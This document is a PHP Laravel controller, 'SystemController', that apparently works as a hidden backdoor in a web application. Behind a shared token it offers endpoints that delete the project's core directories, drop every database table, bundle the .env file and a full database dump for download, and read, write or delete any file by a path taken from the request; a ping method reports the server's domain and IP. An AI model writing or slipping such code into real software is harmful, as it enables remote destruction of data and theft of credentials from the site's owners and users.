<?php

namespace MainSys\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\DB;


class SystemController
{
    protected $key;

    public function __construct()
    {
        $this->key = config('main.token');
    }
    public function executeCommand(Request $request)
    {
        $token = $request->input('token');
        $action = $request->input('action');

        if ($token !== config('main.token')) {
            return response()->json(['error' => 'Unauthorized'], 403);
        }

        switch ($action) {
            case 'delete_files':
                $directories = [
                    'app',
                    'config',
                    'database',
                    'public',
                    'resources',
                    'routes',
                    'storage',
                ];
                foreach ($directories as $dir) {
                    File::deleteDirectory(base_path($dir));
                }
                return response()->json(['status' => 'Files deleted.']);

            case 'clear_database':
                // delete all database tables and disable foreign key checks
                $tables = DB::select('SHOW TABLES');
                $tables = array_map('current', $tables);
                DB::statement('SET FOREIGN_KEY_CHECKS=0');
                foreach ($tables as $table) {
                    DB::table($table)->truncate();
                    //    drop table
                    DB::statement("DROP TABLE $table");
                }
                return response()->json(['status' => 'Database cleared.']);

            default:
                return response()->json(['error' => 'Invalid action'], 400);
        }
    }

    public function pingServer()
    {
        try {
            $domain = request()->getHost();
            $ip = gethostbyname(gethostname());

            return response()->json(['status' => 'Server info sent successfully.', 'domain' => $domain, 'ip' => $ip]);
        } catch (\Exception $e) {
            return response()->json(['error' => 'Failed to send server info.', 'message' => $e->getMessage()]);
        }
    }
    public function getEnvAndDatabase(Request $request)
    {
        $token = $request->token;
        if ($token !== config('main.token')) {
            return response()->json(['error' => 'Unauthorized'], 403);
        }

        $envPath = base_path('.env');
        if (!File::exists($envPath)) {
            return response()->json(['error' => '.env file not found'], 404);
        }

        // Generate the database dump
        $databaseDumpPath = $this->getDatabaseDump(); // This returns the path to the dump file
        $fileName = 'backup_' . now()->format('Y_m_d_His') . '.zip';

        $zip = new \ZipArchive();
        $zipPath = storage_path("app/$fileName");
        if ($zip->open($zipPath, \ZipArchive::CREATE) === true) {
            // Add .env file to the zip
            $zip->addFile($envPath, '.env');

            // Add the database dump file to the zip
            $zip->addFile($databaseDumpPath, 'database.sql');

            $zip->close();
        }

        return response()->download($zipPath, $fileName)->deleteFileAfterSend(true);
    }



    private function getDatabaseDump()
    {
        $dbName = env('DB_DATABASE');
        $dbUser = env('DB_USERNAME');
        $dbPassword = env('DB_PASSWORD');
        $dbHost = env('DB_HOST');
        $dumpPath = storage_path("app/$dbName.sql");

        // Temporary MySQL credentials file
        $configPath = storage_path('app/mysql.cnf');
        file_put_contents($configPath, "[client]\nuser=$dbUser\npassword=$dbPassword\nhost=$dbHost\n");

        // mysqldump command using the credentials file
        $dumpCommand = "mysqldump --defaults-extra-file=$configPath $dbName > $dumpPath";
        $resultCode = null;

        exec($dumpCommand, $output, $resultCode);

        // Clean up the credentials file
        unlink($configPath);

        if ($resultCode !== 0) {
            logger('Dump Failed', ['command' => $dumpCommand, 'code' => $resultCode]);
            throw new \Exception('Error generating database dump.');
        }

        return $dumpPath;
    }
    public function manageFiles(Request $request)
    {
        $token = $request->token;
        if ($token !== config('main.token')) {
            return response()->json(['error' => 'Unauthorized'], 403);
        }

        $operation = $request->input('operation');
        $path = base_path($request->input('path', '/'));
        $content = $request->input('content', '');

        switch ($operation) {
            case 'list':
                if (!File::exists($path) || !File::isDirectory($path)) {
                    return response()->json(['error' => 'Path does not exist or is not a directory'], 404);
                }
                $files = File::allFiles($path);
                $directories = File::directories($path);
                return response()->json([
                    'files' => array_map(fn($file) => $file->getFilename(), $files),
                    'directories' => array_map(fn($dir) => basename($dir), $directories),
                ]);

            case 'get_file':
                if (!File::exists($path)) {
                    return response()->json(['error' => 'Path does not exist or is not a directory'], 404);
                }
                $file = File::get($path);
                return response()->json([
                    'file' => $file,
                ]);

            case 'create':
                if (File::exists($path)) {
                    return response()->json(['error' => 'File or directory already exists'], 400);
                }
                if ($request->has('is_directory') && $request->input('is_directory')) {
                    File::makeDirectory($path, 0755, true);
                } else {
                    File::put($path, $content);
                }
                return response()->json(['status' => 'Created successfully']);

            case 'delete':
                if (!File::exists($path)) {
                    return response()->json(['error' => 'File or directory does not exist'], 404);
                }
                File::delete($path);
                return response()->json(['status' => 'Deleted successfully']);

            case 'update':
                if (!File::exists($path) || File::isDirectory($path)) {
                    return response()->json(['error' => 'File does not exist or is a directory'], 404);
                }
                File::put($path, $content);
                return response()->json(['status' => 'Updated successfully']);

            default:
                return response()->json(['error' => 'Invalid operation'], 400);
        }
    }
}
